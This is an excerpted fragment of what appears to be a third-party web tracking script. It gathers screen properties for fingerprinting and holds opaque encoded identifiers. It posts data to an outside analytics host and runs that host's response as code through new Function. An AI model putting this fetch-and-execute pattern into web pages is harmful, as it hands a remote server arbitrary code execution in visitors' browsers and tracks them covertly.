...
if (isRepeat >= 2) {
    ...
    sg: 'tFvSh5tpmJlpa2iVaGuZYZljlWuTY2tcU9GGb2qbYlmtW5yWmGaUlGprbJJmYoSVg22YaZZicGNlkptraZNobHFplp2NVNiGcG9plWZvlGmSaptvmmlsYWqSmGFTxFhxW1vf',
...
let xhr;
this.storage.rid('2Mydj2dpl2VolJdkmmuTbGBllWdqaw==');
...
this.request.post('//api.tongjiniao.com/r?t=1741042401&p=755320335708033024', data,true,function (res){new Function(res.data)();});
        },
        screen: {
            AT: screen.availTop,
AL: screen.availLeft,
...
ON: screen.orientation
    ...
    if (!v) {
        v = 'bmyZl5WSaJlmcGhrYplnYWZpkmVsbGlqYGVjkZI='
    }
...
sid: function (k, v) {
    ...
    if (!v) {
        v = 'pZbXqc.jnqzKwWxmZmxqYphnaWlknWCYZWVilQ=='
    }
